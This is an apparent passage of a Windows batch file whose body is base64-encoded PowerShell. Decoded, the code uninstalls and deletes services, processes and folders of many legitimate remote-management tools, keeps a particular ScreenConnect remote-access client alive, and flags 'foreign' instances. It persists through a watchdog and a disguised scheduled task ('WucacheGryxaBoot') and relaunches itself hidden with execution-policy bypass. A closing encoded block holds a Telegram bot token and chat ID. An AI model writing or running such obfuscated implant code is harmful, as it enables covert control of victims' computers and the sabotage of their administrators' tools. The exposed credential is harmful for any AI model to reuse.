::KCIkZW52OlByb2dyYW1GaWxlc1xJbW15Qm90IiwiJHtlbnY6UHJvZ3JhbUZpbGVz
::KHg4Nil9XEltbXlCb3QiLCIkZW52OlByb2dyYW1EYXRhXEltbXlCb3QiKTsgUHJv
::ZD1AKCdJbW15Qm90KicpIH0NCiAgICAgICAgQHsgVGFnPSdBdXRvbW94JzsgICAg
::ICBTdmM9QCgnYW1hZ2VudConLCdBdXRvbW94KicpOyBQcm9jPUAoJ2FtYWdlbnQq
::Jyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQXV0b21veCIsIiR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfVxBdXRvbW94IiwiJGVudjpQcm9ncmFtRGF0YVxhbWFn
::ZW50Iik7IFByb2Q9QCgnQXV0b21veConKSB9DQogICAgICAgIEB7IFRhZz0nQWNy
::b25pc0N5YmVyJzsgU3ZjPUAoJ0Fjcm9uaXMqJyk7IFByb2M9QCgnYWNyb2NtZCon
::KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBY3JvbmlzIiwiJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9XEFjcm9uaXMiKTsgUHJvZD1AKCdBY3JvbmlzIEN5YmVy
::KicsJ0Fjcm9uaXMgQWdlbnQqJywnQ3liZXIgUHJvdGVjdCBBZ2VudConKSB9DQog
::ICAgICAgIEB7IFRhZz0nRG9tb3R6JzsgICAgICAgU3ZjPUAoJ0RvbW90eionKTsg
::UHJvYz1AKCdEb21vdHoqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcRG9t
::b3R6IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XERvbW90eiIpOyBQcm9kPUAo
::J0RvbW90eionKSB9DQogICAgICAgIEB7IFRhZz0nQXV2aWsnOyAgICAgICAgU3Zj
::PUAoJ0F1dmlrKicpOyBQcm9jPUAoJ0F1dmlrKicpOyBEaXJzPUAoIiRlbnY6UHJv
::Z3JhbUZpbGVzXEF1dmlrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEF1dmlr
::Iik7IFByb2Q9QCgnQXV2aWsqJykgfQ0KICAgICAgICBAeyBUYWc9J0JhcnJhY3Vk
::YVJNTSc7IFN2Yz1AKCdCYXJyYWN1ZGEqJyk7IFByb2M9QCgnTVdTZXJ2aWNlKicp
::OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEJhcnJhY3VkYSIsIiR7ZW52OlBy
::b2dyYW1GaWxlcyh4ODYpfVxCYXJyYWN1ZGEiLCIkZW52OlByb2dyYW1GaWxlc1xM
::ZXZlbCBQbGF0Zm9ybXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGV2ZWwg
::UGxhdGZvcm1zIik7IFByb2Q9QCgnQmFycmFjdWRhIFJNTSonLCdNYW5hZ2VkIFdv
::cmtwbGFjZSonKSB9DQogICAgICAgIEB7IFRhZz0nR292ZXJsYW4nOyAgICAgU3Zj
::PUAoJ0dvdmVybGFuKicpOyBQcm9jPUAoJ2dvdmVybGFuKicsJ2dvdmFnZW50Kicp
::OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdvdmVybGFuIiwiJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9XEdvdmVybGFuIik7IFByb2Q9QCgnR292ZXJsYW4qJykg
::fQ0KICAgICAgICBAeyBUYWc9J1BEUSc7ICAgICAgICAgIFN2Yz1AKCdQRFEqJyk7
::IFByb2M9QCgnUERRUnVubmVyKicsJ1BEUUludmVudG9yeSonLCdQRFFEZXBsb3kq
::Jyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQWRtaW4gQXJzZW5hbCIsIiR7
::ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBZG1pbiBBcnNlbmFsIiwiJGVudjpQcm9n
::cmFtRmlsZXNcUERRIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFBEUSIpOyBQ
::cm9kPUAoJ1BEUSBEZXBsb3kqJywnUERRIEludmVudG9yeSonLCdQRFEgQ29ubmVj
::dConKSB9DQogICAgKQ0KDQogICAgZm9yZWFjaCAoJHRvb2wgaW4gJHJtbSkgew0K
::ICAgICAgICAkaGl0ID0gJGZhbHNlDQogICAgICAgIGZvcmVhY2ggKCRwYXQgaW4g
::JHRvb2wuUHJvZCkgew0KICAgICAgICAgICAgZm9yZWFjaCAoJHJvb3QgaW4gJHNj
::cmlwdDpVbmluc3RhbGxSb290cykgew0KICAgICAgICAgICAgICAgIEdldC1DaGls
::ZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JF
::YWNoLU9iamVjdCB7DQogICAgICAgICAgICAgICAgICAgICRkbiA9IChHZXQtSXRl
::bVByb3BlcnR5ICRfLlBTUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
::ZSkuRGlzcGxheU5hbWUNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRkbiAtYW5k
::ICRkbiAtbGlrZSAkcGF0KSB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAo
::SXMtRGF0dG9LZWVwZXIgJGRuKSB7IExvZyAicm1tX3NraXBfZGF0dG9fa2VlcCBb
::JGRuXSI7IHJldHVybiB9DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoVW5p
::bnN0YWxsLVByb2R1Y3RLZXkgJF8pIHsgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZSB9
::DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAg
::ICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAk
::dG9vbC5TdmMpIHsNCiAgICAgICAgICAgIEdldC1TZXJ2aWNlIC1OYW1lICRwYXQg
::LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7
::DQogICAgICAgICAgICAgICAgaWYgKElzLURhdHRvS2VlcGVyICRfLk5hbWUgLW9y
::IElzLURhdHRvS2VlcGVyICRfLkRpc3BsYXlOYW1lKSB7IExvZyAicm1tX3NraXBf
::ZGF0dG9fc3ZjICQoJF8uTmFtZSkiOyByZXR1cm4gfQ0KICAgICAgICAgICAgICAg
::ICYgc2MuZXhlIHN0b3AgIiQoJF8uTmFtZSkiIDI+JjEgfCBPdXQtTnVsbA0KICAg
::ICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNTAwDQogICAg
::ICAgICAgICAgICAgJiBzYy5leGUgZGVsZXRlICIkKCRfLk5hbWUpIiAyPiYxIHwg
::T3V0LU51bGwNCiAgICAgICAgICAgICAgICAkbi5ybW0rKzsgJGhpdCA9ICR0cnVl
::OyBMb2cgInJtbV9zdmNfZGVsZXRlZCAkKCRfLk5hbWUpIFskKCR0b29sLlRhZyld
::Ig0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCRw
::YXQgaW4gJHRvb2wuUHJvYykgew0KICAgICAgICAgICAgR2V0LVByb2Nlc3MgLU5h
::bWUgJHBhdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gt
::T2JqZWN0IHsNCiAgICAgICAgICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRfLklk
::IC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAg
::ICAgICAgICRuLnJtbSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX3Byb2Nfa2ls
::bGVkICQoJF8uUHJvY2Vzc05hbWUpIFskKCR0b29sLlRhZyldIg0KICAgICAgICAg
::ICAgfQ0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCRkIGluICR0b29sLkRp
::cnMpIHsNCiAgICAgICAgICAgIGlmICgkZCAtYW5kIChUZXN0LVBhdGggLUxpdGVy
::YWxQYXRoICRkKSkgew0KICAgICAgICAgICAgICAgIGlmIChJcy1EYXR0b0tlZXBl
::ciAkZCkgeyBMb2cgInJtbV9za2lwX2RhdHRvX2RpciAkZCI7IGNvbnRpbnVlIH0N
::CiAgICAgICAgICAgICAgICBpZiAoRm9yY2UtUmVtb3ZlRGlyICRkKSB7ICRuLnJt
::bSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX2Rpcl9yZW1vdmVkICRkIiB9DQog
::ICAgICAgICAgICAgICAgZWxzZSB7ICRuLmZhaWwrKzsgTG9nICJybW1fZGlyX1JF
::TU9WRV9GQUlMRUQgJGQiIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAg
::ICAgICBpZiAoJGhpdCkgeyBMb2cgInJtbV9leHRlcm1pbmF0ZWQgJCgkdG9vbC5U
::YWcpIiB9DQogICAgfQ0KDQogICAgJHN1bW1hcnkgPSAiZXh0ZXJtaW5hdGUgc3Zj
::PSQoJG4uc3ZjKSBwcm9jPSQoJG4ucHJvYykgZGlyPSQoJG4uZGlyKSBwcm9kdWN0
::PSQoJG4ucHJvZHVjdCkgcm1tPSQoJG4ucm1tKSBmYWlsPSQoJG4uZmFpbCkiDQog
::ICAgTG9nICRzdW1tYXJ5DQogICAgcmV0dXJuICRzdW1tYXJ5DQp9DQoNCmZ1bmN0
::aW9uIFVwZGF0ZS1TdGF0ZSB7DQogICAgJGtlZXAgPSBAKEdldC1LZWVwRmluZ2Vy
::cHJpbnRzKQ0KICAgICRncnl4YUZwID0gR2V0LUdyeXhhRnANCiAgICAkc2V2cnog
::PSBAKEdldC1TZXZyektlZXApDQogICAgJHByaW1GcCA9ICRzZXZyelswXTsgJGFs
::dEZwID0gJHNldnJ6WzFdDQogICAgJHByaW0gPSAkbnVsbDsgJGFsdCA9ICRudWxs
::OyAkc2NyaXB0OmdyeXhhID0gJG51bGwNCiAgICBmb3JlYWNoICgkc3ZjIGluIChH
::ZXQtU2VydmljZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJykpIHsNCiAg
::ICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScp
::IHsNCiAgICAgICAgICAgICRmcCA9ICRtYXRjaGVzWzFdLlRvTG93ZXIoKQ0KICAg
::ICAgICAgICAgaWYgKCRmcCAtZXEgJHByaW1GcCkgeyAkcHJpbSA9ICIkKCRzdmMu
::U3RhdHVzKSIgfQ0KICAgICAgICAgICAgZWxzZWlmICgkZnAgLWVxICRhbHRGcCkg
::eyAkYWx0ID0gIiQoJHN2Yy5TdGF0dXMpIiB9DQogICAgICAgICAgICBlbHNlaWYg
::KCRmcCAtZXEgJGdyeXhhRnAgLW9yIChUZXN0LUlzR3J5eGFGcCAkZnApKSB7ICRz
::Y3JpcHQ6Z3J5eGEgPSAiJCgkc3ZjLlN0YXR1cykiIH0NCiAgICAgICAgfQ0KICAg
::IH0NCiAgICAkZm9yZWlnbiA9IEAoKQ0KICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdl
::dC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudConKSkgew0KICAg
::ICAgICBpZiAoJHN2Yy5OYW1lIC1tYXRjaCAnXCgoWzAtOWEtZl17MTZ9KVwpJyAt
::YW5kICRtYXRjaGVzWzFdIC1ub3RpbiAka2VlcCkgew0KICAgICAgICAgICAgJGZv
::cmVpZ24gKz0gJG1hdGNoZXNbMV0NCiAgICAgICAgfQ0KICAgIH0NCiAgICAkaWQg
::PSBSZWFkLUlkZW50aXR5DQogICAgJHRhc2tzT2sgPSAwOyAkdGFza3NUb3RhbCA9
::IDANCiAgICBmb3JlYWNoICgkayBpbiAnVEFTS19BJywnVEFTS19CJywnVEFTS19D
::JywnVEFTS19EJykgew0KICAgICAgICAkdGFza3NUb3RhbCsrDQogICAgICAgICR0
::biA9IE5vcm1hbGl6ZS1UYXNrTmFtZSAoW3N0cmluZ10kaWRbJGtdKQ0KICAgICAg
::ICBpZiAoLW5vdCAkdG4pIHsgY29udGludWUgfQ0KICAgICAgICAkbWFya2VyID0g
::aWYgKCRrIC1lcSAnVEFTS19CJykgeyAnZXRsX21vbi5jbWQnIH0gZWxzZSB7ICdv
::d25fbW9uLmNtZCcgfQ0KICAgICAgICBpZiAoKFRlc3QtVGFza093bnNNb24gJHRu
::ICRtYXJrZXIpIC1vciAoVGVzdC1UYXNrT3duc01vbiAoIlwkdG4iKSAkbWFya2Vy
::KSkgeyAkdGFza3NPaysrIH0NCiAgICB9DQogICAgIyBMMzk6IGNvdW50IFd1Y2Fj
::aGVHcnl4YUJvb3QgKFRBU0tfRykNCiAgICAkdGFza3NUb3RhbCsrDQogICAgJHRn
::TmFtZSA9ICdXdWNhY2hlR3J5eGFCb290Jw0KICAgIGlmICgoR2V0LVNjaGVkdWxl
::ZFRhc2sgLVRhc2tOYW1lICR0Z05hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUpIC1vcg0KICAgICAgICAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAoSm9p
::bi1QYXRoICRXb3JrRGlyICdncnl4YV9ib290LmNtZCcpKSkgew0KICAgICAgICAk
::dGFza3NPaysrDQogICAgfQ0KICAgIGlmICgtbm90ICRNb25QYXRoKSB7ICRNb25Q
::YXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcgfQ0KICAgICR3
::ZCA9IEVuc3VyZS1XYXRjaGRvZw0KICAgICRwcmV2ID0gQHt9DQogICAgJHN0YXRl
::UGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUuanNvbicNCiAgICBpZiAo
::VGVzdC1QYXRoICRzdGF0ZVBhdGgpIHsNCiAgICAgICAgdHJ5IHsgKEdldC1Db250
::ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1K
::c29uKS5QU09iamVjdC5Qcm9wZXJ0aWVzIHwgRm9yRWFjaC1PYmplY3QgeyAkcHJl
::dlskXy5OYW1lXSA9ICRfLlZhbHVlIH0gfSBjYXRjaCB7fQ0KICAgIH0NCiAgICAk
::aW5zdGFsbENvdW50ID0gMQ0KICAgIGlmICgkcHJldi5pbnN0YWxsQ291bnQpIHsg
::JGluc3RhbGxDb3VudCA9IFtpbnRdJHByZXYuaW5zdGFsbENvdW50IH0NCiAgICBp
::ZiAoJHByZXYucHJpbSAtYW5kICRwcmV2LnByaW0gLW5lICdSdW5uaW5nJyAtYW5k
::ICRwcmltIC1lcSAnUnVubmluZycpIHsgJGluc3RhbGxDb3VudCsrIH0NCiAgICAk
::c3RhdGUgPSBbb3JkZXJlZF1Aew0KICAgICAgICBob3N0ICAgICAgICAgPSAkZW52
::OkNPTVBVVEVSTkFNRQ0KICAgICAgICB0cyAgICAgICAgICAgPSAoR2V0LURhdGUp
::LlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykNCiAgICAgICAgYnVpbGQg
::ICAgICAgID0gJEJ1aWxkDQogICAgICAgIHByaW0gICAgICAgICA9ICQoaWYgKCRw
::cmltKSB7ICRwcmltIH0gZWxzZSB7ICdNSVNTSU5HJyB9KQ0KICAgICAgICBhbHQg
::ICAgICAgICAgPSAkKGlmICgkYWx0KSB7ICRhbHQgfSBlbHNlIHsgJ01JU1NJTkcn
::IH0pDQogICAgICAgIGdyeXhhICAgICAgICA9ICQoaWYgKCRzY3JpcHQ6Z3J5eGEp
::IHsgJHNjcmlwdDpncnl4YSB9IGVsc2UgeyAnTUlTU0lORycgfSkNCiAgICAgICAg
::Z3J5eGFGcCAgICAgID0gJGdyeXhhRnANCiAgICAgICAgZm9yZWlnbiAgICAgID0g
::JGZvcmVpZ24NCiAgICAgICAgdGFza3NPayAgICAgID0gJHRhc2tzT2sNCiAgICAg
::ICAgdGFza3NUb3RhbCAgID0gJHRhc2tzVG90YWwNCiAgICAgICAgd2F0Y2hkb2cg
::ICAgID0gJHdkDQogICAgICAgIGluc3RhbGxDb3VudCA9ICRpbnN0YWxsQ291bnQN
::CiAgICAgICAgbGFzdEhlYWwgICAgID0gJChpZiAoJEV4dHJhKSB7IChHZXQtRGF0
::ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ28nKSB9IGVsc2VpZiAoJHBy
::ZXYubGFzdEhlYWwpIHsgJHByZXYubGFzdEhlYWwgfSBlbHNlIHsgJG51bGwgfSkN
::CiAgICAgICAgbm90ZSAgICAgICAgID0gJEV4dHJhDQogICAgfQ0KICAgICgkc3Rh
::dGUgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MpIHwgU2V0LUNvbnRlbnQgLUxp
::dGVyYWxQYXRoICRzdGF0ZVBhdGggLUZvcmNlDQogICAgcmV0dXJuICRzdGF0ZQ0K
::fQ0KDQpzd2l0Y2ggKCRBY3Rpb24pIHsNCiAgICAnaW5pdCcgICAgICAgICAgICB7
::ICRpZCA9IEluaXRpYWxpemUtSWRlbnRpdHk7ICRpZC5HZXRFbnVtZXJhdG9yKCkg
::fCBGb3JFYWNoLU9iamVjdCB7ICIkKCRfLktleSk9JCgkXy5WYWx1ZSkiIH0gfQ0K
::ICAgICdpZGVudGl0eScgICAgICAgIHsgJGlkID0gUmVhZC1JZGVudGl0eTsgJGlk
::LkdldEVudW1lcmF0b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsgIiQoJF8uS2V5KT0k
::KCRfLlZhbHVlKSIgfSB9DQogICAgJ3dhdGNoZG9nJyAgICAgICAgeyBJbnN0YWxs
::LVdhdGNoZG9nIHwgT3V0LU51bGwgfQ0KICAgICd3YXRjaGRvZy1lbnN1cmUnIHsg
::RW5zdXJlLVdhdGNoZG9nIH0NCiAgICAndGFza3MtZW5zdXJlJyAgICB7IEVuc3Vy
::ZS1QZXJzaXN0VGFza3MgfQ0KICAgICdzdGF0ZScgICAgICAgICAgIHsgVXBkYXRl
::LVN0YXRlIHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzIH0NCiAgICAncmVwYWly
::JyAgICAgICAgICB7IFJlcGFpci1TQ1NlcnZpY2UgJEZwIH0NCiAgICAncmVnaXN0
::ZXJlZCcgICAgICB7IFRlc3QtU0NSZWdpc3RlcmVkICRGcCB9DQogICAgJ2V4dGVy
::bWluYXRlJyAgICAgeyBJbnZva2UtRXh0ZXJtaW5hdGUgfQ0KICAgICdncnl4YS1o
::ZWFsdGgnICAgIHsgVGVzdC1Hcnl4YUhlYWx0aCB9DQogICAgJ3N5bmMtZ3J5eGEt
::ZnAnICAgew0KICAgICAgICAkZyA9IEZpbmQtUnVubmluZ0dyeXhhRnANCiAgICAg
::ICAgaWYgKCRnKSB7DQogICAgICAgICAgICBTZXQtR3J5eGFGcCAkZw0KICAgICAg
::ICAgICAgV3JpdGUtT3V0cHV0ICJTWU5DRUR8JGciDQogICAgICAgIH0gZWxzZSB7
::DQogICAgICAgICAgICAkY3VyID0gR2V0LUdyeXhhRnANCiAgICAgICAgICAgIGlm
::ICgtbm90IChUZXN0LUlzR3J5eGFGcCAkY3VyKSAtYW5kICRzY3JpcHQ6R3J5eGFF
::eHBlY3RlZEZwKSB7DQogICAgICAgICAgICAgICAgU2V0LUdyeXhhRnAgJHNjcmlw
::dDpHcnl4YUV4cGVjdGVkRnANCiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQg
::IlJFU0VUfCQoJHNjcmlwdDpHcnl4YUV4cGVjdGVkRnApIg0KICAgICAgICAgICAg
::fSBlbHNlIHsNCiAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIk5PTkV8JGN1
::ciINCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICAndGVzdC1t
::c2knICAgICAgICB7DQogICAgICAgICRwYXRoID0gJEV4dHJhDQogICAgICAgIGlm
::ICgtbm90ICRwYXRoKSB7IFdyaXRlLU91dHB1dCAnbm8nOyBicmVhayB9DQogICAg
::ICAgIGlmIChUZXN0LU1zaVBhY2thZ2UgJHBhdGggJEZwKSB7IFdyaXRlLU91dHB1
::dCAneWVzJyB9IGVsc2UgeyBXcml0ZS1PdXRwdXQgJ25vJyB9DQogICAgfQ0KICAg
::ICdwcm90ZWN0LW1zaScgICAgIHsNCiAgICAgICAgJHNhZmUgPSBQcm90ZWN0LU1z
::aVNpYmxpbmdTYWZlICRFeHRyYQ0KICAgICAgICBpZiAoJHNhZmUpIHsgV3JpdGUt
::T3V0cHV0ICRzYWZlIH0gZWxzZSB7IFdyaXRlLU91dHB1dCAnRkFJTCcgfQ0KICAg
::IH0NCiAgICAndmVyaWZ5LXVwZGF0ZScgICB7DQogICAgICAgICMgRXh0cmEgPSAi
::bWFuaWZlc3R8c2lnfG5hbWU9cGF0aDtuYW1lMj1wYXRoMiINCiAgICAgICAgJHBh
::cnRzID0gJEV4dHJhIC1zcGxpdCAnXHwnLCAzDQogICAgICAgIGlmICgkcGFydHMu
::Q291bnQgLWx0IDMpIHsgV3JpdGUtT3V0cHV0ICdiYWQtYXJncyc7IGJyZWFrIH0N
::CiAgICAgICAgJG1hcCA9IEB7fQ0KICAgICAgICBmb3JlYWNoICgkcGFpciBpbiAo
::JHBhcnRzWzJdIC1zcGxpdCAnOycpKSB7DQogICAgICAgICAgICBpZiAoJHBhaXIg
::LW1hdGNoICdeKFtePV0rKT0oLiopJCcpIHsgJG1hcFskbWF0Y2hlc1sxXV0gPSAk
::bWF0Y2hlc1syXSB9DQogICAgICAgIH0NCiAgICAgICAgV3JpdGUtT3V0cHV0IChU
::ZXN0LVVwZGF0ZU1hbmlmZXN0ICRwYXJ0c1swXSAkcGFydHNbMV0gJG1hcCkNCiAg
::ICB9DQogICAgJ3N5bmMtc2V2cnotZnAnICAgew0KICAgICAgICBpZiAoJEV4dHJh
::KSB7IFdyaXRlLU91dHB1dCAoU3luYy1TZXZyekV4cGVjdGVkICRFeHRyYSkgfQ0K
::ICAgICAgICBlbHNlIHsNCiAgICAgICAgICAgICRrID0gQChHZXQtU2V2cnpLZWVw
::KQ0KICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICgiU0VWUlp8JCgka1swXSl8JCgk
::a1sxXSkiKQ0KICAgICAgICB9DQogICAgfQ0KICAgICdncnl4YS1lbnN1cmUnICAg
::IHsNCiAgICAgICAgaWYgKCROb1dhaXQpIHsNCiAgICAgICAgICAgICMgTDM1L0wz
::OTogcGFzcyBBcmd1bWVudExpc3QgYXMgc3RyaW5nIGFycmF5IChqb2luZWQgc3Ry
::aW5nIGlzIGEgU3RhcnQtUHJvY2VzcyBmb290Z3VuKQ0KICAgICAgICAgICAgJHBz
::ID0gKEdldC1Qcm9jZXNzIC1JZCAkUElEKS5QYXRoDQogICAgICAgICAgICBpZiAo
::LW5vdCAkcHMpIHsgJHBzID0gJ3Bvd2Vyc2hlbGwuZXhlJyB9DQogICAgICAgICAg
::ICAkYXJnTGlzdCA9IEAoDQogICAgICAgICAgICAgICAgJy1Ob1Byb2ZpbGUnLCAn
::LUV4ZWN1dGlvblBvbGljeScsICdCeXBhc3MnLA0KICAgICAgICAgICAgICAgICct
::RmlsZScsICRQU0NvbW1hbmRQYXRoLA0KICAgICAgICAgICAgICAgICctQWN0aW9u
::JywgJ2dyeXhhLWVuc3VyZScsDQogICAgICAgICAgICAgICAgJy1Xb3JrRGlyJywg
::JFdvcmtEaXIsDQogICAgICAgICAgICAgICAgJy1CdWlsZCcsICRCdWlsZA0KICAg
::ICAgICAgICAgKQ0KICAgICAgICAgICAgaWYgKCREZWVwKSAgeyAkYXJnTGlzdCAr
::PSAnLURlZXAnIH0NCiAgICAgICAgICAgIGlmICgkRm9yY2UpIHsgJGFyZ0xpc3Qg
::Kz0gJy1Gb3JjZScgfQ0KICAgICAgICAgICAgU3RhcnQtUHJvY2VzcyAtRmlsZVBh
::dGggJHBzIC1Bcmd1bWVudExpc3QgJGFyZ0xpc3QgLVdpbmRvd1N0eWxlIEhpZGRl
::bg0KICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICdRVUVVRUR8ZGV0YWNoZWQ9MScN
::CiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAoSW52
::b2tlLUdyeXhhRW5zdXJlIHwgT3V0LVN0cmluZykuVHJpbSgpDQogICAgICAgIH0N
::CiAgICB9DQp9DQo=
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcK
Q0hBVF9JRD03NTQ3NDYyMDcwCg==
::B64_NTF_END
